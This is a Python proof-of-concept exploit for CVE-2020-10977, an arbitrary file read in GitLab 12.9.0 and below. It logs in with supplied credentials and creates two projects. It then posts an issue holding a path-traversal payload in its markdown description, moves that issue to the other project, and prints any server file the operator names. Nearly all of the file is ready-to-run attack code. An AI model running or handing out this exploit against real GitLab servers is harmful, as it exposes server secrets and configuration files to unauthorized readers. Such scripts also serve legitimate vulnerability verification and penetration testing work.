#!/usr/bin/env python3

import sys
import json
import requests
import argparse
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('url', help='Target URL with http(s)://')
parser.add_argument('username', help='GitLab Username')
parser.add_argument('password', help='GitLab Password')
args = parser.parse_args()

base_url = args.url
if base_url.startswith('http://') or base_url.startswith('https://'):
	pass
else:
	print('[-] Include http:// or https:// in the URL!')
	sys.exit()
if base_url.endswith('/'):
	base_url = base_url[:-1]

username = args.username
password = args.password

login_url = base_url + '/users/sign_in'
project_url = base_url + '/projects/new'
create_url = base_url + '/projects'
prev_issue_url = ''
csrf_token = ''
project_names = ['ProjectOne', 'ProjectTwo']

session = requests.Session()

def banner():
	print('-'*34)
	print('--- CVE-2020-10977 ---------------')
	print('--- GitLab Arbitrary File Read ---')
	print('--- 12.9.0 & Below ---------------')
	print('-'*34 + '\n')
	print('[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]')
	print('[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]\n')

def show_info():
	print('[+] Target        : ' + base_url)
	print('[+] Username      : ' + username)
	print('[+] Password      : ' + password)
	print('[+] Project Names : {}, {}\n'.format(project_names[0], project_names[1]))

def login():
	print('[!] Trying to Login...')
	try:
		login_req = session.get(login_url, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()

	login_sc = login_req.status_code
	if login_sc == 200:
		login_resp = login_req.text
		soup = BeautifulSoup(login_resp, 'html.parser')
		meta = soup.find_all('meta')

		for entry in meta:
			if 'name' in entry.attrs:
				if entry.attrs['name'] == 'csrf-token':
					csrf_token = entry.attrs['content']
	else:
		print('[-] Status : ' + str(login_req.status_code))
		sys.exit()

	login_data = {
		'utf8': '✓',
        'authenticity_token': csrf_token,
        'user[login]': username,
        'user[password]': password,
        'user[remember_me]': 0
	}

	login_req = session.post(login_url, data=login_data, allow_redirects=False)
	if login_req.status_code == 302 and 'redirected' in login_req.text:
		print('[+] Login Successful!')
	else:
		print('[-] Status : ' + str(login_req.status_code))
		print('[-] Login Failed!')
		sys.exit()

def create_project(project):
	global csrf_token
	print('[!] Creating {}...'.format(project))
	try:
		project_req = session.get(project_url, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	project_resp = project_req.text
	soup = BeautifulSoup(project_resp, 'html.parser')
	inputs = soup.find_all('input')
	for entry in inputs:
		if 'name' in entry.attrs:
			if entry.attrs['name'] == 'project[namespace_id]':
				project_id = entry.attrs['value']

	meta = soup.find_all('meta')
	for entry in meta:
		if 'name' in entry.attrs:
			if entry.attrs['name'] == 'csrf-token':
				csrf_token = entry.attrs['content']

	create_data = {
        'utf8': '✓',
        'authenticity_token': csrf_token,
        'project[ci_cd_only]': 'false',
        'project[name]': project,
        'project[namespace_id]': project_id,
        'project[path]': project,
        'project[description]': '',
        'project[visibility_level]' : '0'
	}
	try:
		create_req = session.post(create_url, data=create_data, allow_redirects=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	if create_req.status_code == 302 and 'redirected' in create_req.text:
		print('[+] {} Created Successfully!'.format(project))
	else:
		pass

def create_issue(project_name):
	global prev_issue_url
	print('[!] Creating an Issue...')
	issue_url = '{}/{}/{}/issues/new'.format(base_url, username, project_name)
	try:
		issue_req = session.get(issue_url, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	issue_resp = issue_req.text
	soup = BeautifulSoup(issue_resp, 'html.parser')
	meta = soup.find_all('meta')
	for entry in meta:
		if 'name' in entry.attrs:
			if entry.attrs['name'] == 'csrf-token':
				csrf_token = entry.attrs['content']

	issue_create_url = issue_url.replace('/new', '')
	issue_data = {
        'utf8': '✓',
        'authenticity_token' : csrf_token,
        'issue[title]': 'read_{}'.format(filename),
        'issue[description]' : '![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})'.format(filename),
        'issue[confidential]' : '0',
        'issue[assignee_ids][]' : '0',
        'issue[label_ids][]' : '',
        'issue[due_date]' : '',
        'issue[lock_version]' : '0'
    }

	try:
		create_req = session.post(issue_create_url, data=issue_data, allow_redirects=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	if create_req.status_code == 302 and 'redirected' in create_req.text:
		print('[+] Issue Created Successfully!')
		create_resp = create_req.text
		soup = BeautifulSoup(create_resp, 'html.parser')
		prev_issue_url = soup.find('a')['href']
		if base_url.startswith('https://') and prev_issue_url.startswith('http://'):
			prev_issue_url = prev_issue_url.replace('http://', 'https://')
	else:
		print('[-] Status : ' + str(create_req.status_code))
		print('[-] Failed to Create an Issue!')

def move_issue(source, second, filename):
	print('[!] Moving Issue...')
	id_url = '{}/{}/{}'.format(base_url, username, second)
	try:
		id_req = session.get(id_url, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	id_resp = id_req.text
	soup = BeautifulSoup(id_resp, 'html.parser')
	body = soup.find('body')
	project_id = body.attrs['data-project-id']
	move_url = prev_issue_url + '/move'

	try:
		csrf_req = session.get(prev_issue_url, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	csrf_resp = csrf_req.text
	soup = BeautifulSoup(csrf_resp, 'html.parser')
	meta = soup.find_all('meta')
	for entry in meta:
		if 'name' in entry.attrs:
			if entry.attrs['name'] == 'csrf-token':
				csrf_token = entry.attrs['content']
	move_data = {
		"move_to_project_id": int(project_id)
	}
	move_data = json.dumps(move_data)
	move_headers = {
		'X-CSRF-Token': csrf_token,
		'X-Requested-With': 'XMLHttpRequest',
		'Content-Type': 'application/json;charset=UTF-8'
	}

	try:
		move_req = session.post(move_url, data=move_data, headers=move_headers)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	if move_req.status_code == 200:
		print('[+] Issue Moved Successfully!')
		description = json.loads(move_req.text)["description"]
		filepath = description.split('](')[1][1:-1]
		fileurl = "{}/{}/{}/{}".format(base_url, username, second, filepath)

		print('[+] File URL : ' + fileurl)
		try:
			contents = session.get(fileurl, verify=False)
		except Exception as exc:
			print('\n[-] Exception : ' + str(exc))
			sys.exit()
		if contents.status_code == 404:
		    print('[-] No such file or directory')
		else:
			print('\n> ' + filename)
			print('{}\n\n{}\n{}\n'.format('-'*40, contents.text, '-'*40 ))
	elif move_req.status_code == 500:
		print('[-] Access Denied!')
	else:
		print('[-] Status : ' + str(move_req.status_code))

def delete_project(project):
	print('[!] Deleting {}...'.format(project))
	delete_data = {
		'utf8': '✓',
		'_method': 'delete',
		'authenticity_token' : csrf_token
	}
	delete_url = '{}/{}/{}'.format(base_url, username, project)
	try:
		delete_req = session.post(delete_url, data=delete_data, verify=False)
	except Exception as exc:
		print('\n[-] Exception : ' + str(exc))
		sys.exit()
	if delete_req.status_code == 200:
		print('[+] {} Successfully Deleted!'.format(project))
	else:
		print('[-] Status : ' + str(delete_req.status_code))

try:
	banner()
	show_info()
	login()
	for project in project_names:
		create_project(project)
	while True:
		filename = input('[>] Absolute Path to File : ')
		create_issue(project_names[0])
		move_issue(project_names[0], project_names[1], filename)
except KeyboardInterrupt:
	print('\n[-] Keyboard Interrupt')
	for project in project_names:
		delete_project(project)
	sys.exit()